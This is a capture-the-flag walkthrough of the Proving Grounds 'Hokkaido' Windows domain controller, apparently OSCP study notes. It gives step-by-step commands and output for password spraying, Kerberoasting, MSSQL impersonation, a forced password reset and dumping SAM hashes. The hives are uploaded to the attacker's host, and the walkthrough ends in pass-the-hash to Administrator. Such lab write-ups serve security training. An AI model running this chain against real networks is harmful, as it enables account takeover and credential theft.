https://medium.com/@sakyb7/proving-grounds-hokkaido-tjnull-oscp-prep-ca34df1e6491
https://aditya-3.gitbook.io/oscp/readme/walkthroughs/pg-practice/hokkaido

NMAP -p- -sCV hokkaido.pgp --open 
- windows machine, check HTTP/LDAP/KERBRUTE/ENUM4LINUX/SMBCLIENT

worth checking:

```bash
1433/tcp  open  ms-sql-s
8531/tcp  open  unknown
```

Kerbrute gives us 4 usernames:
info
administrator
discovery
maintenance

create wordlists with passwords (usernames as password included)

example:
Winter2023
Summer2023
Spring2023
Fall2023
info
administrator
discovery
maintenance
ofni
rotartsinimda
yrevocsid
ecnanetniam


brute force with crackmapexec

crackmapexec smb hokkaido.pgp  --shares -u usernames -p usernames --continue-on-success
we have user with password info:info

crackmapexec smb hokkaido.pgp  --shares -u info -p info
shows we have read write on homes


lets login:
impacket-smbclient info:info@hokkaido.pgp

shares -> use homes -> ls
# use homes
# ls
drw-rw-rw-          0  Tue Oct  7 18:49:48 2025 .
drw-rw-rw-          0  Tue Oct  7 18:48:20 2025 ..
drw-rw-rw-          0  Sat Nov 25 09:57:09 2023 Angela.Davies
drw-rw-rw-          0  Sat Nov 25 09:57:09 2023 Annette.Buckley
drw-rw-rw-          0  Sat Nov 25 09:57:09 2023 Anthony.Anderson
drw-rw-rw-          0  Sat Nov 25 09:57:09 2023 Catherine.Knight
drw-rw-rw-          0  Sat Nov 25 09:57:09 2023 Charlene.Wallace
drw-rw-rw-          0  Sat Nov 25 09:57:09 2023 Cheryl.Singh
drw-rw-rw-          0  Sat Nov 25 09:57:09 2023 Deborah.Francis
drw-rw-rw-          0  Sat Nov 25 09:57:09 2023 Declan.Woodward
drw-rw-rw-          0  Sat Nov 25 09:57:09 2023 Elliott.Jones
drw-rw-rw-          0  Sat Nov 25 09:57:09 2023 Gordon.Brown
drw-rw-rw-          0  Sat Nov 25 09:57:09 2023 Grace.Lees
drw-rw-rw-          0  Sat Nov 25 09:57:09 2023 Hannah.O'Neill
drw-rw-rw-          0  Sat Nov 25 09:57:09 2023 Irene.Dean
drw-rw-rw-          0  Sat Nov 25 09:57:09 2023 Julian.Davies
drw-rw-rw-          0  Sat Nov 25 09:57:09 2023 Lynne.Tyler
drw-rw-rw-          0  Sat Nov 25 09:57:09 2023 Molly.Edwards
drw-rw-rw-          0  Sat Nov 25 09:57:09 2023 Rachel.Jones
drw-rw-rw-          0  Sat Nov 25 09:57:09 2023 Sian.Gordon
drw-rw-rw-          0  Sat Nov 25 09:57:09 2023 Tracy.Wood
drw-rw-rw-          0  Sat Nov 25 09:57:09 2023 Victor.Kelly

Potential list of users

more investigation, NETLOGON contains nice file

use NETLOGON
# ls
drw-rw-rw-          0  Sat Nov 25 08:40:08 2023 .
drw-rw-rw-          0  Sat Nov 25 08:17:33 2023 ..
drw-rw-rw-          0  Wed Dec  6 10:44:26 2023 temp
# cd temp
# ls
drw-rw-rw-          0  Wed Dec  6 10:44:26 2023 .
drw-rw-rw-          0  Sat Nov 25 08:40:08 2023 ..
-rw-rw-rw-         27  Wed Dec  6 10:44:26 2023 password_reset.txt
# get password_reset.txt
# mget *
[*] Downloading password_reset.txt
# 

cat password_reset.txt 
Initial Password: Start123!  

try
impacket-GetUserSPNs hokkaido-aerospace.com/'info':'info' -dc-ip hokkaido.pgp -debug -outputfile kerberoast.txt
noting special

lets check new pass


crackmapexec smb hokkaido.pgp  --shares -u usernames -p 'Start123!' --continue-on-success
SMB         hokkaido.pgp    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:hokkaido-aerospace.com) (signing:True) (SMBv1:False)
SMB         hokkaido.pgp    445    DC               [-] hokkaido-aerospace.com\info:Start123! STATUS_LOGON_FAILURE 
SMB         hokkaido.pgp    445    DC               [-] hokkaido-aerospace.com\administrator:Start123! STATUS_LOGON_FAILURE 
SMB         hokkaido.pgp    445    DC               [+] hokkaido-aerospace.com\discovery:Start123! 
SMB         hokkaido.pgp    445    DC               [-] hokkaido-aerospace.com\maintanance:Start123! STATUS_LOGON_FAILURE 
SMB         hokkaido.pgp    445    DC               [-] hokkaido-aerospace.com\Start123!:Start123! STATUS_LOGON_FAILURE 

kerberoasting with new credentials:
impacket-GetUserSPNs hokkaido-aerospace.com/'discovery:Start123!' -dc-ip hokkaido.pgp -debug -request -outputfile kerberoast.txt 
!success!

$krb5tgs$23$*maintenance$HOKKAIDO-AEROSPACE.COM$hokkaido-aerospace.com/maintenance*$5d772265fe6e23708dd9ce45270b7694$6e74070d45746af3cf512ba74a142bdddd9721a0bf6be996001f2e08e84127d1678a4da1c0f435e08b598b72039fae01547a207028ddfcfcd5a54ec9381bad58930f67a081bccfe6e01447f00d4aea5d8e0442e917add68e994f87b9befe5d88952fbad0f81413ae3223ff9e0df9a1317cd2f02ca663f240aa7e285885eb109ef7fd6221102e078064c12d87609a8b2c9a257ff7f3f239d18556c84669f4977f70d25b39492b2e9c5d6a608befbb60d15f767e4130b1b23cd6e78aa4f32af64b7271061ca18903d8174a03b71a8d5f1b21f70b5be37a48217a8cce6d66cab9a6dd0d7d5768ec7c82f012a0b643b5e6804328cb2d88e479e616603307b098b20b35a649ce2ad31ad5f944d756bc064ea38e80e68b88dd0a9c88e3a62956c35cbf91fa6c07b2f57c92a9cb5f50f3c4b8cf8ebd2bc8ab106744b1bf21ee9d7d4498df9076e2fa0d8a724664cc67a394e388113ed3d628f186796194117cdd82c65da78b2bc650c4d685212e23c57d27ecbe738bde3efc30cc205dcfa5b37791c6687852fc2018e15b27963598ceb881cd629d7704cf8ee10172585088fc6a07724621753d34e72b452b72d2ffe2dc1be42893dd882a0f59ddeae19a753f6df212fa31f29e72b6b134218e744fce4d228a6376695f46c7685a0e5a72608a1bebad9d7607d038fb3428154b9c8dad1584b93a004289f585a10797791b3f05fce23cbcb8d723738d0448e4b19c888bbf127c63a5b208184d8d2cb81033a0172d69435ab6cd2a7bca9f1f347aaae8b7d9b2b92a2c4df34b226c932d47a03c26594f68e9ae3df1f634ddebca08debeea5030a0e455d52d0ebfbf14a921dee9f95f13c0b06a29a3911daedf51a286a6ada50e29fa400a61189a912a621fe5464e3b3538f914afe813efd7d3f8c0d9c065192de62645715c1b00de004af0b02a71ce9051c6cd830a8b7af1960886cf5a5394d11428cf56da4ac5662c7bfde1fe6879a3f9e2dda470b907e075231d68cdd8cc7851966616509a922fd943371e461a178422fdd4dce844e47cec3afcd72ef3058936051da15cbb618687796294cb6ba510b19d64e5d123346c5624dcccf58d9840ba1c4e0480dcdaa24cb453888b2559f4c4ec3e139b41d4fdc914ef4d211ea7faa1f4df62c9096e6f19b6df2d901d5482f11ffbe228d1c1983fba35fad2db75d76d2794c806f05d8b9cf08addae83dc7aa574a666938e5cb5e717f17223d8ac0e47b9d74badae3a87c322774a9e675250ddc89e37b7b666d70c106cd90780bdf3845f669f77c06ef17cff5ba573d5b29d8e32906131c48c88655d468abaf2e5b020675c2ce766b72858b77bb83e323792bf90bb621d7905a381eecd077e328f5ae9dec48e92566ea1b4a807a7a2aabd440b254a8dda00a9abc9b49d4196e7c8ad9a1bb16e1f8f412126d93728fa5595c2ec2e60e4fcb8d89381621f110cd2d25cbade6302b4a060ac349e06559f90d991f41914c792ca24ebc21b335bfc7c4ef0a1cad494922cfb18a6ce59185e7f420c3bff5000017bdf8cb012a2869927e4568e02d1647a7abcc24aafef7990135510477e
 we have hash but useless for now

now lest check sql as it was worth checking

ipacket-mssqlclient  'hokkaido-aerospace.com/discovery':'Start123!'@hokkaido.pgp -dc-ip hokkaido.pgp -windows-auth
next SELECT name FROM master.dbo.sysdatabases to enum DB

SQL (HAERO\discovery  guest@master)> SELECT name FROM master.dbo.sysdatabases
name      
-------   
master    

tempdb    

model     

msdb      

hrappdb   


SQL (HAERO\discovery  guest@master)> select * from hrappdb.INFORMATION_SCHEMA.TABLES;
ERROR(DC\SQLEXPRESS): Line 1: The server principal "HAERO\discovery" is not able to access the database "hrappdb" under the current security context.

so we have an issue, check whoc an we inpersonate

SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'

so lets do it: 

EXECUTE AS LOGIN = 'hrappdb-reader' SELECT SYSTEM_USER SELECT IS_SRVROLEMEMBER('sysadmin')

check if works:
SELECT name FROM master.dbo.sysdatabases - > ok!

SELECT * FROM hrappdb.INFORMATION_SCHEMA.TABLES;
TABLE_CATALOG   TABLE_SCHEMA   TABLE_NAME   TABLE_TYPE   
-------------   ------------   ----------   ----------   
hrappdb         dbo            sysauth      b'BASE TABLE'   


Yess!!! now check table
SQL (hrappdb-reader  guest@master)> select * from hrappdb.dbo.sysauth;
id   name               password           
--   ----------------   ----------------   
 0   b'hrapp-service'   b'Untimed$Runny'   

We have new pass
'hrapp-service':'Untimed$Runny'


try bloodhound
sudo bloodhound-python -u "hrapp-service" -p 'Untimed$Runny' -d hokkaido-aerospace.com -c all --zip -ns 192.168.238.40
(had to provide ip)

locate our account and check outbound Object Control

We ahve GenericWrite over Hazel.Green

Lets Get hashes!

./targetedKerberoast.py -v -d 'hokkaido-aerospace.com' -u 'hrapp-service' -p 'Untimed$Runny' --dc-ip hokkaido.pgp
Printing hash for (Hazel.Green)
$krb5tgs$23$*Hazel.Green$HOKKAIDO-AEROSPACE.COM$hokkaido-aerospace.com/Hazel.Green*$fc0b2ab50d250f8fd32ff518816192ee$bcb8ad1c70fa6b9905d6dac925dad129d2d7dbeed2da6416d25fa254c587b958cc503f481e8eaf01d47590ef72faa67c3eca0944d3b2dab48c869b204ff200baf95bf0af097c87bdc69fbdcf06a52c795a3f3d19ff8de891d5c0be7d3336132ccec8a5d823f1b1f1ab1e8761b15a5b0c11d4eabdc8a4ba14508637b7c4d464445d098f81200e34edf2299889bb7d9986c37b5f7bd3c64fb210758016d7536b216c790189a8b269b3bb5647b0094766bb0237352c2c2d417e9c46c615b768f2e7a86b9ab37a6a02185d0b86f7f9a9629b00e3d71324dd6983be88f8bf08b0164a0a1814cb975432ed45e4f608535435112650b2f5a16c0b08b0450c7ef92abb03dc8c92b34af18284f118d3973e17293330410342c7d77f48aa66dbff677bbc51423ab6a3f1f91c19f276a64bfd621ca6c61e5b2af19b39877511cf34b230e98443a850487924b56e9c0e486934d16bcf5b8ae4a469c3e6fb56f2fa30657e7bb8e619f63a3c292e2cb3c74c219a903bedc168f0ad4da88f057208211a8cf62771a59602322e902dccf8c44445b1e62485a89c139c5724e2068fa535bb39fc91672aff863139e4d7413b6303ad56a9c33b77349cbceab2886b26c070ea140101f6ae8e933b16f654c81ace12d3bf75d43fe9e9ca477a6bf4b7dd789f6935d53ba2f6935366a30b0c385c1f2be7512f5a79d359bb2de0ba169ecb4f3189729404e460a6cc87667701763118bdd5fc6ed7114ad1de307af8b4a1d3d75947d68bf5e39ab1cdcc911d89113d2f26f561f0a6e42602724a3f496cc08af5acbf63e06e04c6787661f29a033ea53aa83dbbf0cecb7c3afeb98f9a3596eb47c26b0329b8c3f10c113fbf8de75cbedd44ee94c0642f20c374bfe6bc02225c0288508ae7dfdd9361f9550834e0ce3421cac6a5649feb89282d6bf0646e73d4f0d27f53d07d0a5601343c620d247f45992484bb2e761fd718487a6da96ddce859b1fcb63932c1611bad02e6a822b11319776337590fe4b14cf714bba0f7dca3f13aaa1259aa70c96ad102b6248d0b8e25d594653f8f4fc47d33fcc19b80737673d05920f6960e4834cde86ba465a4a0d6cfb62b435a88145cba6f6207309dadeb46dca1d1a8cf3f1371a85a6fe9cb2606beb4b3ff3a55784b38491252cebc2fbf79c3433407392315313ff7f733b068ae596fc33dfa5edd054265c13e48ba3c70175ebe5efbee13557259c1de25be82f4f8340e390a488d1692c89a866678de46ae1cb1012c55332d60076118453510a68926f25e780f143bdd5a614c9bcb1301d30db06b5e6f6e5c6f7d46c3c6dd27b4d6dd097e94bda39717dd92096fa49b19bb62b49d06fac83465e02b3268b7fda157a1e8215ebc5be64744e3e24f13e0c852ad1e5f43c643a303de19a4fcfdbcaa729f47a2012ea874a90a14bb8f512a6100e6b40f65704b5a204e36679d4cb55a6554bcafd879fc0c07a366abc7633658cdc905da091ead11d28a95ca33485f95a76a9d4b96c971d885d0fca89307cbbbad7f1f34bcc0e61abe223cd88ee5206e85376ed266f17760892f89e2e11edf4efe29002040e375478ebc150558bde3ea01ce0506711a42ecb77bdd6facaf4e3f66ac9260caab07e6c386d416781da193fc71

hashcat -m 13100 hazel2 /usr/share/wordlists/rockyou.txt --force --potfile-disable 

haze1988

Bloodhound (new IP. one day after)
bloodhound-python -u "Hazel.Green" -p 'haze1988' -d hokkaido-aerospace.com -c all --zip -ns 192.168.207.40

Hazel is member of IT group, has ForceChangePassword of Tier1 admin Molly smith (Outbound object control confirmed in pathfinding)

net rpc password "molly.smith" "Password123@" -U "192.168.207.40"/"Hazel.Green"%"haze1988" -S "192.168.207.40"

rpcclient -N  192.168.208.40 -U 'hazel.green%haze1988'
setuserinfo2 MOLLY.SMITH 23 'Password123!

checked for rdp
nxc rdp 192.168.207.40 -u molly.smith -p 'Password123@'
Pwnded!


connect:
xfreerdp3 /u:molly.smith /p:'Password123@' /v:192.168.207.40



check:
whoami 
whoami /priv

SeChangeNotifyPrivilege Enabled!

reg save hklm\sam c:\Users\molly.smith\sam
reg save hklm\system c:\Users\molly.smith\system



upload into tun0
192.168.45.234:8000/upload

impacket-secretsdump -system system -sam sam local 
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x2fcb0ca02fb5133abd227a05724cd961
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:d752482897d54e239376fddb2a2109e4:::


evil-winrm -i 192.168.207.40  -u administrator -H "d752482897d54e239376fddb2a2109e4"

*Evil-WinRM* PS C:\Users\Administrator\Desktop> type proof.txt
63c4d767b4812c4c2d47b66cd2977325

